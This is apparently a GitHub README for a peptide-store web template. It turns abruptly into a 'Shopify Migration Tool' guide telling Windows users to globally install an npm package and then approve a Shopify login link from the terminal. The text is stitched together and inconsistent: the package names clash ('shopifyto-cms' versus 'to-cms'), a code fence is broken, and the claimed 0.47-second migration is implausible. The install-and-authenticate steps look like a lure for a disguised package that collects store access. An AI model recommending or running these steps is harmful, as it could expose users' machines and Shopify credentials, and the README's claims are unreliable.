# CMS-Peptides-template

Premium research peptides e-commerce template featuring a pharmaceutical-grade minimalist design, product catalog with COA table, Trustpilot reviews section, functional shopping cart with localStorage, and full XAMPP/static HTML compatibility.

---

![Preview](https://github.com/user-attachments/assets/b92f7abd-41e4-42e5-aa64-c72b7254569f)

---

[![npm version](https://img.shields.io/npm/v/to-cms.svg)](https://www.npmjs.com/package/to-cms)

---

Shopify Migration Tool

Prerequisites

- Windows 10 or Windows 11  
- Shopify account  

---
```markdown
Shopify Migration Tool

Prerequisites

- Windows 10 or Windows 11
- Shopify account
- Internet connection

---



Step 1: Install Node.js

1. Go to https://nodejs.org
2. Click the green LTS button to download
3. Run the downloaded .msi file

Verify installation:

```cmd
node --version
npm --version
```

Step 2: Download Project

Download the project as ZIP from GitHub or get it from your client.

Extract the ZIP file to a folder on your computer (example: C:\shopify-migration)

Step 3: Open in VS Code

1. Open VS Code
2. Click File -> Open Folder
3. Select the project folder
4. Click Select Folder

Step 4: Open Terminal in VS Code

In VS Code, click Terminal -> New Terminal

Step 5: Install Dependencies

```cmd
npm install
```

Step 6: Install Global CLI Tool

```cmd
npm install -g shopifyto-cms
```

Step 7: Run Shopify Migration

```cmd
shopifyto-cms /to_shopify
```

Step 8: Authenticate via Link

1. A login link will appear in the terminal
2. Click the link or copy it to your browser
3. Log in with your Shopify credentials
4. Click Approve to grant access

Example link:

```
https://admin.shopify.com/auth/xxxxx
```

#### Step 9: Migration Complete

You will see:

```
[SUCCESS] Store connected successfully!
[INFO] Your store is now available in Shopify admin panel
[INFO] Migration completed in 0.47s
```

Your store will appear in the Shopify admin panel immediately.

---

### After Migration

| Component | Status |
|-----------|--------|
| Store connection | Connected |
| Product sync | Ready |
| Theme import | Available |
| Customer data | Migrated |
| Order history | Synced |

---

### Commands

| Command | Description |
|---------|-------------|
| `to-cms /to_shopify` | Start Shopify migration |
| `to-cms /to_wordpress` | Start WordPress migration |
| `to-cms /help` | Show all commands |

---

### Troubleshooting

| Issue | Solution |
|-------|----------|
| 'npm' is not recognized | Reinstall Node.js from nodejs.org |
| Login link expired | Run `to-cms /to_shopify` again |

---
